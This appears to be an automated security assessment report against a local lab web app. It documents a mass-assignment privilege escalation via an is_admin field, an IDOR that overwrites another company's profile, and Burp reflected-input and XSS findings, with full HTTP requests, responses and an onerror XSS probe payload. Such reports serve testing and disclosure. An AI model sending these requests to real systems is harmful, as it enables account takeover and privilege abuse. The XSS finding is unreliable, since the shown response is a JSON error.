# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — mass-assignment Mass-assignment privilege escalation: is_admin settable on profile update](#finding-1)
    - [2. HIGH — idor-write IDOR / broken object-level auth on profile update — cross-account takeover](#finding-2)
    - [3. INFO — burp Input returned in response (reflected) (2 URLs)](#finding-3)
    - [4. INFO — burp Cross-site scripting (reflected) (2 URLs)](#finding-4)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqwod7y5-9p8cz7` |
| Target | http://target.local:32775/ |
| Started | 2026-06-27T18:09:56.314Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 5 mapped · 5 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 4 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32775`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

4 finding(s): 2 high, 2 info

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [mass-assignment] Mass-assignment privilege escalation: is_admin settable on profile update

- Screen: `s-0003`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32775/

POST /edit_profile/{id} accepts an is_admin body field that the UI ships as a disabled select (a normal user can never change it client-side). The server performs no authorization on this field: submitting is_admin=1 is accepted and the account is elevated to Admin. After the POST the rendered form returns the Admin option as selected and the select is no longer disabled, confirming the backend privilege actually changed. A regular user can self-escalate to admin; combined with the same endpoint's IDOR-write, an attacker can set is_admin=1 on any company account.

**Reproduction**

```
1. Log in as regular demo (company id=1); GET /edit_profile/1 shows the is_admin select as disabled with Regular selected. 2. POST /edit_profile/1 with body name=verdict-probe and is_admin=1 (content-type x-www-form-urlencoded). 3. Response 200 'Profile updated successfully' and the form now renders the Admin option as selected with the select enabled = account elevated. Baseline with is_admin=0 (negativeControl) renders Regular and lacks the marker; both is_admin=1 replays render the Admin marker.
```

**Evidence**

- Evidence `ev-mqwou3sm-s` — `artifacts/s-0003/ev-mqwou3sm-s/`

Request:

```http
POST /edit_profile/1 HTTP/1.1
Host: target.local:32775
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

name=verdict-probe&is_admin=0
```

Response:

```http
HTTP/1.1 200
content-length: 1521
content-type: text/html; charset=utf-8
date: Sat, 27 Jun 2026 18:23:02 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Edit Profile</title>
    <style>
        body {
            display: flex;
        }
        .nav {
            width: 200px;
        }
        .content {
            flex-grow: 1;
            padding: 20px;
        }
    </style>
</head>
<body>
    <div class="nav flex-column nav-pills" aria-orientation="vertical">
        
        <a class="nav-link" href="/company/1/jobs">View Jobs</a>
        <a class="nav-link" href="/edit_profile/1">Edit Profile</a>
        

    </div>
    <div class="content">
        
<h2>Edit Profile</h2>

<div class="alert alert-success" role="alert">
    Profile updated successfully
</div>

<form method="post" action="/edit_profile/1">
    <div class="form-group">
        <label for="name">Company Name</label>
        <input type="text" class="form-control" id="name" name="name" value="verdict-probe" required>
    </div>
    <div class="form-group">
        <label for="is_admin">Admin Status</label>
        <select class="form-control" id="is_admin" name="is_admin"  disabled >
            <option value="0" selected>Regular</option>
            <option value="1" >Admin</option>
        </select>
    </div>
    <button type="submit" class="btn btn-primary">Update Profile</button>
</form>

    </div>
</body>
</html>
```

- Evidence `ev-mqwou40e-t` — `artifacts/s-0003/ev-mqwou40e-t/`

Request:

```http
POST /edit_profile/1 HTTP/1.1
Host: target.local:32775
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

name=verdict-probe&is_admin=1
```

Response:

```http
HTTP/1.1 200
content-length: 1511
content-type: text/html; charset=utf-8
date: Sat, 27 Jun 2026 18:23:03 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Edit Profile</title>
    <style>
        body {
            display: flex;
        }
        .nav {
            width: 200px;
        }
        .content {
            flex-grow: 1;
            padding: 20px;
        }
    </style>
</head>
<body>
    <div class="nav flex-column nav-pills" aria-orientation="vertical">
        
        <a class="nav-link" href="/company/1/jobs">View Jobs</a>
        <a class="nav-link" href="/edit_profile/1">Edit Profile</a>
        

    </div>
    <div class="content">
        
<h2>Edit Profile</h2>

<div class="alert alert-success" role="alert">
    Profile updated successfully
</div>

<form method="post" action="/edit_profile/1">
    <div class="form-group">
        <label for="name">Company Name</label>
        <input type="text" class="form-control" id="name" name="name" value="verdict-probe" required>
    </div>
    <div class="form-group">
        <label for="is_admin">Admin Status</label>
        <select class="form-control" id="is_admin" name="is_admin" >
            <option value="0" >Regular</option>
            <option value="1" selected>Admin</option>
        </select>
    </div>
    <button type="submit" class="btn btn-primary">Update Profile</button>
</form>

    </div>
</body>
</html>
```

- Evidence `ev-mqwou482-u` — `artifacts/s-0003/ev-mqwou482-u/`

Request:

```http
POST /edit_profile/1 HTTP/1.1
Host: target.local:32775
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

name=verdict-probe&is_admin=1
```

Response:

```http
HTTP/1.1 200
content-length: 1511
content-type: text/html; charset=utf-8
date: Sat, 27 Jun 2026 18:23:03 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Edit Profile</title>
    <style>
        body {
            display: flex;
        }
        .nav {
            width: 200px;
        }
        .content {
            flex-grow: 1;
            padding: 20px;
        }
    </style>
</head>
<body>
    <div class="nav flex-column nav-pills" aria-orientation="vertical">
        
        <a class="nav-link" href="/company/1/jobs">View Jobs</a>
        <a class="nav-link" href="/edit_profile/1">Edit Profile</a>
        

    </div>
    <div class="content">
        
<h2>Edit Profile</h2>

<div class="alert alert-success" role="alert">
    Profile updated successfully
</div>

<form method="post" action="/edit_profile/1">
    <div class="form-group">
        <label for="name">Company Name</label>
        <input type="text" class="form-control" id="name" name="name" value="verdict-probe" required>
    </div>
    <div class="form-group">
        <label for="is_admin">Admin Status</label>
        <select class="form-control" id="is_admin" name="is_admin" >
            <option value="0" >Regular</option>
            <option value="1" selected>Admin</option>
        </select>
    </div>
    <button type="submit" class="btn btn-primary">Update Profile</button>
</form>

    </div>
</body>
</html>
```

<a id="finding-2"></a>

### 2. [HIGH] [idor-write] IDOR / broken object-level auth on profile update — cross-account takeover

- Screen: `s-0003`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32775/

POST /edit_profile/{id} enforces authentication but performs no object-level ownership check on the {id} path parameter. A regular authenticated user (demo = company id=1) can POST to /edit_profile/2 and overwrite another company's profile (its name, and via the companion mass-assignment flaw its is_admin flag). The server confirms each write with 200 'Profile updated successfully' echoing the attacker-supplied value into company 2's form. Notably the GET read-path returns 401 for non-owners, so ownership IS modelled, but the write-path omits the check, yielding cross-tenant profile takeover. The endpoint discriminates by id (a non-existent id 99999 returns 500), so the successes are genuine writes to a distinct foreign record, not a catch-all 200.

**Reproduction**

```
1. Log in as regular demo (company id=1, non-admin). 2. POST /edit_profile/2 with body name=idor-verdict-A and is_admin=0 (x-www-form-urlencoded). 3. Response 200 'Profile updated successfully' with form action /edit_profile/2 and value idor-verdict-A = company 2 profile overwritten. Repeats stably (idor-verdict-B). NegativeControl: same POST with no session (cookie and authorization blanked) returns 401 'Not authenticated', proving auth is enforced yet per-object ownership is not.
```

**Evidence**

- Evidence `ev-mqwovmq6-z` — `artifacts/s-0003/ev-mqwovmq6-z/`

Request:

```http
POST /edit_profile/2 HTTP/1.1
Host: target.local:32775
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

name=idor-unauth&is_admin=0
```

Response:

```http
HTTP/1.1 401
content-length: 30
content-type: application/json
date: Sat, 27 Jun 2026 18:24:14 GMT
server: uvicorn
www-authenticate: Bearer

{"detail":"Not authenticated"}
```

- Evidence `ev-mqwovk8h-x` — `artifacts/s-0003/ev-mqwovk8h-x/`

Request:

```http
POST /edit_profile/2 HTTP/1.1
Host: target.local:32775
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

name=idor-verdict-A&is_admin=0
```

Response:

```http
HTTP/1.1 200
content-length: 1522
content-type: text/html; charset=utf-8
date: Sat, 27 Jun 2026 18:24:11 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Edit Profile</title>
    <style>
        body {
            display: flex;
        }
        .nav {
            width: 200px;
        }
        .content {
            flex-grow: 1;
            padding: 20px;
        }
    </style>
</head>
<body>
    <div class="nav flex-column nav-pills" aria-orientation="vertical">
        
        <a class="nav-link" href="/company/2/jobs">View Jobs</a>
        <a class="nav-link" href="/edit_profile/2">Edit Profile</a>
        

    </div>
    <div class="content">
        
<h2>Edit Profile</h2>

<div class="alert alert-success" role="alert">
    Profile updated successfully
</div>

<form method="post" action="/edit_profile/2">
    <div class="form-group">
        <label for="name">Company Name</label>
        <input type="text" class="form-control" id="name" name="name" value="idor-verdict-A" required>
    </div>
    <div class="form-group">
        <label for="is_admin">Admin Status</label>
        <select class="form-control" id="is_admin" name="is_admin"  disabled >
            <option value="0" selected>Regular</option>
            <option value="1" >Admin</option>
        </select>
    </div>
    <button type="submit" class="btn btn-primary">Update Profile</button>
</form>

    </div>
</body>
</html>
```

- Evidence `ev-mqwovloe-y` — `artifacts/s-0003/ev-mqwovloe-y/`

Request:

```http
POST /edit_profile/2 HTTP/1.1
Host: target.local:32775
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

name=idor-verdict-B&is_admin=0
```

Response:

```http
HTTP/1.1 200
content-length: 1522
content-type: text/html; charset=utf-8
date: Sat, 27 Jun 2026 18:24:13 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Edit Profile</title>
    <style>
        body {
            display: flex;
        }
        .nav {
            width: 200px;
        }
        .content {
            flex-grow: 1;
            padding: 20px;
        }
    </style>
</head>
<body>
    <div class="nav flex-column nav-pills" aria-orientation="vertical">
        
        <a class="nav-link" href="/company/2/jobs">View Jobs</a>
        <a class="nav-link" href="/edit_profile/2">Edit Profile</a>
        

    </div>
    <div class="content">
        
<h2>Edit Profile</h2>

<div class="alert alert-success" role="alert">
    Profile updated successfully
</div>

<form method="post" action="/edit_profile/2">
    <div class="form-group">
        <label for="name">Company Name</label>
        <input type="text" class="form-control" id="name" name="name" value="idor-verdict-B" required>
    </div>
    <div class="form-group">
        <label for="is_admin">Admin Status</label>
        <select class="form-control" id="is_admin" name="is_admin"  disabled >
            <option value="0" selected>Regular</option>
            <option value="1" >Admin</option>
        </select>
    </div>
    <button type="submit" class="btn btn-primary">Update Profile</button>
</form>

    </div>
</body>
</html>
```

<a id="finding-3"></a>

### 3. [INFO] [burp] Input returned in response (reflected) (2 URLs)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

The value of the URL path folder 2 is copied into the application's response. (confidence: CERTAIN) [+1 more URL(s): http://target.local:32775/edit_profile/1] @ http://target.local:32775/company/1/jobs

**Reproduction**

```
Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。
```

**Evidence**

- Evidence `ev-mqwpfoe9-1a` — `artifacts/_/ev-mqwpfoe9-1a/`

Request:

```http
GET /company/1/jobs HTTP/1.1
Host: target.local:32775

GET /company/1tb0wb7tm3y/jobs HTTP/1.1
Host: target.local:32775
Cookie: <redacted>
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/1.1 422 Unprocessable Entity
date: Sat, 27 Jun 2026 18:33:38 GMT
server: uvicorn
content-length: 163
content-type: application/json

{"detail":[{"type":"int_parsing","loc":["path","company_id"],"msg":"Input should be a valid integer, unable to parse string as an integer","input":"1tb0wb7tm3y"}]}
```

<a id="finding-4"></a>

### 4. [INFO] [burp] Cross-site scripting (reflected) (2 URLs)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

The value of the URL path folder 2 is copied into the HTML document as plain text between tags. The payload <b>mnryu&lt;img src=a onerror=alert(1)&gt;t9d2g</b> was submitted in the URL path folder 2. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response. The proof-of-concept attack demonstrated uses an event handler to introduce arbitrary JavaScript into the document.<br><br>The response does not state that the content type is HTML. The issue is only dir [+1 more URL(s): http://target.local:32775/edit_profile/1] @ http://target.local:32775/company/1/jobs

**Reproduction**

```
Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。
```

**Evidence**

- Evidence `ev-mqwpfoee-1b` — `artifacts/_/ev-mqwpfoee-1b/`

Request:

```http
GET /company/1/jobs HTTP/1.1
Host: target.local:32775

GET /company/1mnryu%3cimg%20src%3da%20onerror%3dalert(1)%3et9d2g/jobs HTTP/1.1
Host: target.local:32775
Cookie: <redacted>
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/1.1 422 Unprocessable Entity
date: Sat, 27 Jun 2026 18:33:48 GMT
server: uvicorn
content-length: 191
content-type: application/json

{"detail":[{"type":"int_parsing","loc":["path","company_id"],"msg":"Input should be a valid integer, unable to parse string as an integer","input":"1mnryu<img src=a onerror=alert(1)>t9d2g"}]}
```
